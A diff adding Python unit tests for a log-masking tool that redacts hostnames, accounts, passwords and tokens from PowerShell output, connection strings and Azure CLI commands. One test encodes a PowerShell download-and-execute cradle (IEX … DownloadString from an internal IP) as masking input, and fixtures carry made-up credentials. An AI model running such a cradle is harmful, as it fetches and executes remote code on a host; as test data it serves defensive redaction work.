@@ -1378,12 +1378,332 @@ def test_camelcase_namespace_is_not_a_hostname():
     check("a capitalised AD domain is still masked", "Corp.Local" not in masked)
 
 
+# ---------------------------------------------------------------------------
+# PowerShell.
+#
+# A Windows investigation is conducted in PowerShell, so a transcript, a
+# script-block log (event 4104) or a pasted console session is one of the most
+# common things to hand this tool — and PowerShell hides its identifiers in
+# shapes no key=value pattern can reach. Every check below was written against
+# output the masker got wrong before these patterns existed.
+# ---------------------------------------------------------------------------
+
+def test_powershell_transcript():
+    raw = ("**********************\n"
+           "Windows PowerShell transcript start\n"
+           "Start time: 20260902141233\n"
+           "Username: CORP\\a.novak\n"
+           "RunAs User: CORP\\a.novak\n"
+           "Machine: WKS-FIN-042 (Microsoft Windows NT 10.0.19045.0)\n"
+           "Host Application: C:\\Windows\\System32\\WindowsPowerShell"
+           "\\v1.0\\powershell.exe\n"
+           "**********************\n"
+           "PS C:\\Users\\a.novak> hostname\n"
+           "WKS-FIN-042\n")
+    masked, mapping = masker.mask(raw, ALL)
+    check("transcript machine masked", "WKS-FIN-042" not in masked)
+    check("transcript user masked", "a.novak" not in masked)
+    # The header is the only line a pattern can anchor on; the bare echo two
+    # lines down is the same machine and used to be sent in the clear.
+    check("bare hostname echo masked too", masked.count("[HOST_1]") == 2
+          or list(mapping.values()).count("WKS-FIN-042") == 1
+          and "WKS-FIN-042" not in masked)
+    # 14 digits, but no card fails its own check digit: this is a timestamp.
+    check("transcript start time is not a credit card",
+          "20260902141233" in masked)
+    check("powershell's own install path kept",
+          "WindowsPowerShell" in masked)
+
+
+def test_powershell_parameters():
+    raw = ("Invoke-Command -ComputerName WKS-FIN-042,WKS-FIN-043 -Credential "
+           "CORP\\admin.tkaur -ScriptBlock { hostname }\n"
+           "Enter-PSSession -HostName ubuntu-jump01 -UserName omid.b\n"
+           "Get-ADUser -Identity a.novak -Properties *\n"
+           "Add-ADGroupMember -Identity \"Domain Admins\" -Members "
+           "a.novak,t.kaur,svc_deploy\n"
+           "New-ADUser -Name \"Petra Vogel\" -SamAccountName p.vogel\n"
+           "Get-Service -DisplayName \"Print Spooler\"\n"
+           "Invoke-Command -ComputerName SRV-01 -Credential $cred\n")
+    masked, _ = masker.mask(raw, ALL)
+    # A space, not "=", separates a PowerShell parameter from its argument.
+    for value in ("WKS-FIN-042", "WKS-FIN-043", "admin.tkaur", "ubuntu-jump01",
+                  "omid.b", "a.novak", "t.kaur", "svc_deploy", "Petra Vogel",
+                  "p.vogel"):
+        check(f"parameter argument masked: {value}", value not in masked)
+    check("a built-in group identifies nobody", "Domain Admins" in masked)
+    check("a service display name is not a person", "Print Spooler" in masked)
+    check("a variable is not a credential", "$cred" in masked)
+
+
+def test_powershell_credentials():
+    raw = ("$password = ConvertTo-SecureString 'Wint3r!2026' -AsPlainText "
+           "-Force\n"
+           "Register-ScheduledTask -User CORP\\svc_deploy -Password "
+           "'D3pl0y!2026' -RunLevel Highest\n"
+           "net use Z: \\\\FS-ARCHIVE-01\\payroll$ /user:CORP\\svc_backup "
+           "Summer2026!\n"
+           "Invoke-WebRequest -Headers @{Authorization=\"Bearer "
+           "eyJhbGciOiJIUzI1NiJ9.abcdefghijklmnop\"}\n")
+    masked, _ = masker.mask(raw, ALL)
+    check("ConvertTo-SecureString literal masked", "Wint3r!2026" not in masked)
+    check("-Password argument masked", "D3pl0y!2026" not in masked)
+    check("net use positional password masked", "Summer2026!" not in masked)
+    check("bearer token masked",
+          "eyJhbGciOiJIUzI1NiJ9.abcdefghijklmnop" not in masked)
+    # The cmdlet is what "$password =" is assigned; masking it there left the
+    # actual credential standing in the next word.
+    check("the cmdlet name is not the secret",
+          "ConvertTo-SecureString" in masked)
+    # \\FS-ARCHIVE-01\payroll$ used to be shredded into a bogus user
+    # "ARCHIVE-01\payroll".
+    check("UNC server masked as a server", "FS-ARCHIVE-01" not in masked)
+    check("the share name survives", "payroll$" in masked)
+
+
+def test_powershell_tables():
+    users = ("Get-LocalUser\n\n"
+             "Name              Enabled Description\n"
+             "----              ------- -----------\n"
+             "Administrator     False   Built-in account\n"
+             "a.novak           True    Finance\n"
+             "svc_backup        True    Veeam service account\n")
+    masked, _ = masker.mask(users, ALL)
+    check("table cell user masked", "a.novak" not in masked)
+    check("table cell service account masked", "svc_backup" not in masked)
+    check("built-in account kept", "Administrator" in masked)
+
+    # The same shape, about software. Masking these protects nobody and makes
+    # the output unreadable.
+    services = ("Get-Service\n\n"
+                "Status   Name               DisplayName\n"
+                "------   ----               -----------\n"
+                "Running  wuauserv           Windows Update\n"
+                "Stopped  RemoteRegistry     Remote Registry\n")
+    masked, mapping = masker.mask(services, ALL)
+    check("Get-Service table untouched", not mapping)
+
+    procs = ("Handles  NPM(K)    PM(K)     CPU(s)     Id  SI ProcessName\n"
+             "-------  ------    -----     ------     --  -- -----------\n"
+             "   1204      82   412508     882.31   8124   1 powershell\n")
+    masked, mapping = masker.mask(procs, ALL)
+    check("Get-Process table untouched", not mapping)
+
+
+def test_powershell_encoded_command():
+    import base64
+    hidden = ("IEX(New-Object Net.WebClient).DownloadString"
+              "('http://10.44.18.7:8080/a.ps1')")
+    benign = "Get-Process | Sort-Object CPU -Descending"
+
+    def enc(cmd):
+        return base64.b64encode(cmd.encode("utf-16-le")).decode()
+
+    masked, mapping = masker.mask(f"powershell.exe -nop -enc {enc(hidden)}",
+                                  ALL)
+    check("encoded command hiding an internal IP is masked",
+          enc(hidden) not in masked)
+    check("and it restores", masker.unmask(masked, mapping)
+          .endswith(enc(hidden)))
+
+    masked, mapping = masker.mask(f"powershell.exe -enc {enc(benign)}", ALL)
+    # Masking this would cost the analyst the command and protect nobody: the
+    # answer is the same either way, which is the test that makes it safe.
+    check("encoded command hiding nothing is kept", enc(benign) in masked)
+
+
+def test_powershell_keeps_runtime_names():
+    raw = ("[System.Net.Dns]::GetHostByName($env:computerName)\n"
+           "$cred = New-Object System.Management.Automation.PSCredential\n"
+           "$wc.Proxy = New-WebProxy \"http://proxy-01.acme.local:8080\"\n"
+           "WSManConfig: Microsoft.WSMan.Management\\WSMan::localhost\\Client\n"
+           "Path : Microsoft.PowerShell.Core\\FileSystem::\\\\NAS-01\\Finance\n")
+    masked, _ = masker.mask(raw, ALL)
+    for value in ("System.Net.Dns", "System.Management.Automation.PSCredential",
+                  "$wc.Proxy", "Microsoft.WSMan.Management\\WSMan",
+                  "Microsoft.PowerShell.Core\\FileSystem"):
+        check(f".NET / provider name kept: {value}", value in masked)
+    check("the customer's proxy is still masked",
+          "proxy-01.acme.local" not in masked)
+    check("the customer's file server is still masked",
+          "NAS-01" not in masked)
+
+
+def test_masked_value_does_not_survive_elsewhere():
+    """The difference between "a pattern matched" and "the value is gone".
+
+    A pattern anchors on one shape of a name; the same name then appears bare
+    somewhere else in the same paste, where nothing marks it. Before this, the
+    masker proved the value was sensitive and sent a copy of it anyway."""
+    raw = ("DeviceName: WKS-FIN-042.corp.acme.local\n"
+           "user=a.novak logged on\n"
+           "Owner: CORP\\a.novak\n"
+           "-- free text --\n"
+           "The alert on WKS-FIN-042 was raised by a.novak in CORP.\n")
+    masked, mapping = masker.mask(raw, ALL)
+    for value in ("WKS-FIN-042", "a.novak", "CORP"):
+        check(f"no copy of {value} survives", value not in masked)
+    check("mapping still restores everything",
+          "WKS-FIN-042.corp.acme.local" in masker.unmask(masked, mapping))
+
+
+def test_one_placeholder_per_value():
+    """Two patterns disagreeing about a label used to produce two aliases for
+    one value, which reads as two different people."""
+    raw = ("Get-Mailbox -Identity anna.novak@acme.com | fl\n"
+           "PrimarySmtpAddress : anna.novak@acme.com\n")
+    _masked, mapping = masker.mask(raw, ALL)
+    aliases = [ph for ph, real in mapping.items()
+               if real == "anna.novak@acme.com"]
+    check("one address, one placeholder", len(aliases) == 1)
+
+
+def test_leakguard_agrees_with_the_masker_on_loopback():
+    """The guard is an independent second opinion, but it must not block a
+    send over the one value the masker keeps by design: every
+    Get-NetTCPConnection paste contains 127.0.0.1."""
+    from log_masker import leakguard
+    masked, mapping = masker.mask(
+        "LocalAddress 127.0.0.1  RemoteAddress 10.4.2.19\n", ALL)
+    findings = leakguard.scan(masked, mapping, [], ALL)
+    check("loopback is not a blocking finding",
+          not leakguard.has_blocking(findings))
+    findings = leakguard.scan("connection from 10.4.2.19", {}, [], ALL)
+    check("a routable address still blocks", leakguard.has_blocking(findings))
+
+
+def test_credit_card_check_digit():
+    raw = ("Start time: 20260902141233\n"
+           "epoch 1581094030464317\n"
+           "card 4111 1111 1111 1111\n")
+    masked, _ = masker.mask(raw, ALL)
+    check("timestamp is not a card", "20260902141233" in masked)
+    check("epoch is not a card", "1581094030464317" in masked)
+    check("a real card number is still masked",
+          "4111 1111 1111 1111" not in masked)
+
+
+def test_powershell_new_aduser():
+    raw = ('New-ADUser -Name "Alice Walker" -GivenName "Alice" '
+           '-Surname "Walker" -SamAccountName "awalker" '
+           '-UserPrincipalName "alice.walker@corp.acme.local" '
+           '-Path "OU=Finance,OU=Users,DC=corp,DC=acme,DC=local" '
+           '-AccountPassword (ConvertTo-SecureString "Winter2026!Secure" '
+           '-AsPlainText -Force) -Enabled $true\n'
+           'Export-PfxCertificate -Cert "Cert:\\LocalMachine\\My\\ABCD" '
+           '-Password (ConvertTo-SecureString "CertKey2026!" -AsPlainText '
+           '-Force)\n')
+    masked, _ = masker.mask(raw, ALL)
+    for value in ("Alice Walker", "Alice", "Walker", "awalker",
+                  "alice.walker@corp.acme.local", "Winter2026!Secure",
+                  "CertKey2026!"):
+        check(f"New-ADUser field masked: {value}", value not in masked)
+    # "-Password (ConvertTo-SecureString ..." used to mask the cmdlet *and*
+    # swallow the opening parenthesis, leaving the password beside it — and
+    # then the propagation pass copied that mistake to both other uses.
+    check("the command still parses",
+          masked.count("(ConvertTo-SecureString") == 2)
+
+
+def test_powershell_credential_in_parens():
+    raw = ('Enter-PSSession -ComputerName 192.168.10.45 '
+           '-Credential (Get-Credential "admin_service") -Port 5985\n')
+    masked, _ = masker.mask(raw, ALL)
+    check("account inside Get-Credential masked",
+          "admin_service" not in masked)
+    check("the port is not an account", "5985" in masked)
+
+
+def test_sql_connection_string():
+    raw = ('$connString = "Server=tcp:sql-prod.database.windows.net,1433;'
+           'Initial Catalog=BillingDB;User ID=sqladmin_dbuser;'
+           'Password=T0pS3cr3tDBPass!;Encrypt=True;"\n')
+    masked, _ = masker.mask(raw, ALL)
+    check("connection-string user masked", "sqladmin_dbuser" not in masked)
+    check("connection-string password masked",
+          "T0pS3cr3tDBPass!" not in masked)
+    check("connection-string server masked",
+          "sql-prod.database.windows.net" not in masked)
+    check("tcp: is a protocol, not a host", "Server=tcp:" in masked)
+
+
+def test_regex_string_is_not_a_username():
+    """A -match pattern reads like a log line; "Account Name:\\s+" used to be
+    masked down to its escape, which corrupts the command."""
+    raw = ('Get-WinEvent -FilterHashtable @{LogName=\'Security\'; Id=4625} | '
+           'Where-Object { $_.Message -match "Account Name:\\s+(?<user>\\w+)" }\n')
+    masked, mapping = masker.mask(raw, ALL)
+    check("the regex literal survives", "Account Name:\\s+" in masked)
+    check("nothing was masked at all", not mapping)
+
+
+def test_host_named_in_prose():
+    raw = ('{"text":"User CORP\\\\r.chen logged into host WORKSTATION-88 '
+           'from IP 192.168.100.54"}\n'
+           'Enter-PSSession : Connecting to remote server '
+           'SRV-SQL-03.corp.acme.local failed\n')
+    masked, _ = masker.mask(raw, ALL)
+    check("asset name after 'host' masked", "WORKSTATION-88" not in masked)
+    # The keyword anchors it, but the value must still be taken whole: a span
+    # that stops at "SRV-SQL-03" sends ".corp.acme.local" in the clear.
+    check("the FQDN after 'server' is not truncated",
+          "corp.acme.local" not in masked)
+    check("'host is unreachable' is not a hostname",
+          not masker.mask("the host is unreachable\n", ALL)[1])
+
+
+def test_azure_cli_and_key_vault():
+    raw = ('az login --service-principal -u "e7c234a1-89bc-4d32-b7e1-8932479'
+           '23847" -p "qX8~7Q_sample_secret_value_89234=" --tenant '
+           '"acme.onmicrosoft.com"\n'
+           'Get-AzKeyVaultSecret -VaultName "kv-prod-eastus-01" -Name '
+           '"DatabaseAdminConnectionString" -AsPlainText\n')
+    masked, _ = masker.mask(raw, ALL)
+    check("service-principal secret masked",
+          "qX8~7Q_sample_secret_value_89234=" not in masked)
+    check("key vault name masked", "kv-prod-eastus-01" not in masked)
+    check("the tenant domain masked", "acme.onmicrosoft.com" not in masked)
+
+
+def test_generic_domain_word_is_not_chased_through_prose():
+    """The domain half of DOMAIN\\user is worth masking everywhere — unless it
+    is an ordinary word, where every mention in a report would be redacted."""
+    raw = ("Get-WmiObject -Credential \"STORAGE\\root_backup\"\n"
+           "Get-WmiObject -Credential \"ACME7\\svc_ops\"\n"
+           "--- SECTION 6: FILE SYSTEM, STORAGE & SMB SHARES ---\n"
+           "the ACME7 domain was reached\n")
+    masked, _ = masker.mask(raw, ALL)
+    check("the qualified account is masked either way",
+          "STORAGE\\root_backup" not in masked)
+    check("a generic word is left alone in prose",
+          "FILE SYSTEM, STORAGE & SMB SHARES" in masked)
+    check("a real NetBIOS domain is still chased down",
+          "ACME7" not in masked)
+
+
 if __name__ == "__main__":
     test_masking_stays_linear()
     test_defender_incident_json()
     test_hash_keys_vs_credential_hashes()
     test_loopback_is_not_customer_data()
     test_camelcase_namespace_is_not_a_hostname()
+    test_powershell_transcript()
+    test_powershell_parameters()
+    test_powershell_credentials()
+    test_powershell_tables()
+    test_powershell_encoded_command()
+    test_powershell_keeps_runtime_names()
+    test_masked_value_does_not_survive_elsewhere()
+    test_one_placeholder_per_value()
+    test_credit_card_check_digit()
+    test_leakguard_agrees_with_the_masker_on_loopback()
+    test_powershell_new_aduser()
+    test_powershell_credential_in_parens()
+    test_sql_connection_string()
+    test_regex_string_is_not_a_username()
+    test_host_named_in_prose()
+    test_azure_cli_and_key_vault()
+    test_generic_domain_word_is_not_chased_through_prose()
     test_roundtrip()
     test_ipv6_vs_timestamp()
     test_bare_hostname_param()
